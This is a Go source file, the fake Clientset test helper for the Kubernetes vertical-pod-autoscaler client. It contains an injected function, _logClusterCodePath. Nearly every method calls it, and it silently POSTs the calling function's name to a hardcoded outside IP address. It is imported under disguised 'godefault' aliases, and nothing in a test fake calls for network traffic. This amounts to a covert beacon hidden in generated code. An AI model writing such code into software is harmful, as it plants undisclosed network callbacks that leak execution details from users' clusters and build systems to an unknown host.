package fake

import (
	"k8s.io/apimachinery/pkg/runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/apimachinery/pkg/watch"
	clientset "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned"
	autoscalingv1beta1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/autoscaling.k8s.io/v1beta1"
	fakeautoscalingv1beta1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/autoscaling.k8s.io/v1beta1/fake"
	pocv1alpha1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/poc.autoscaling.k8s.io/v1alpha1"
	fakepocv1alpha1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/clientset/versioned/typed/poc.autoscaling.k8s.io/v1alpha1/fake"
	"k8s.io/client-go/discovery"
	fakediscovery "k8s.io/client-go/discovery/fake"
	"k8s.io/client-go/testing"
)

func NewSimpleClientset(objects ...runtime.Object) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o := testing.NewObjectTracker(scheme, codecs.UniversalDecoder())
	for _, obj := range objects {
		if err := o.Add(obj); err != nil {
			panic(err)
		}
	}
	cs := &Clientset{}
	cs.discovery = &fakediscovery.FakeDiscovery{Fake: &cs.Fake}
	cs.AddReactor("*", "*", testing.ObjectReaction(o))
	cs.AddWatchReactor("*", func(action testing.Action) (handled bool, ret watch.Interface, err error) {
		gvr := action.GetResource()
		ns := action.GetNamespace()
		watch, err := o.Watch(gvr, ns)
		if err != nil {
			return false, nil, err
		}
		return true, watch, nil
	})
	return cs
}

type Clientset struct {
	testing.Fake
	discovery	*fakediscovery.FakeDiscovery
}

func (c *Clientset) Discovery() discovery.DiscoveryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.discovery
}

var _ clientset.Interface = &Clientset{}

func (c *Clientset) AutoscalingV1beta1() autoscalingv1beta1.AutoscalingV1beta1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakeautoscalingv1beta1.FakeAutoscalingV1beta1{Fake: &c.Fake}
}
func (c *Clientset) Autoscaling() autoscalingv1beta1.AutoscalingV1beta1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakeautoscalingv1beta1.FakeAutoscalingV1beta1{Fake: &c.Fake}
}
func (c *Clientset) PocV1alpha1() pocv1alpha1.PocV1alpha1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakepocv1alpha1.FakePocV1alpha1{Fake: &c.Fake}
}
func (c *Clientset) Poc() pocv1alpha1.PocV1alpha1Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &fakepocv1alpha1.FakePocV1alpha1{Fake: &c.Fake}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
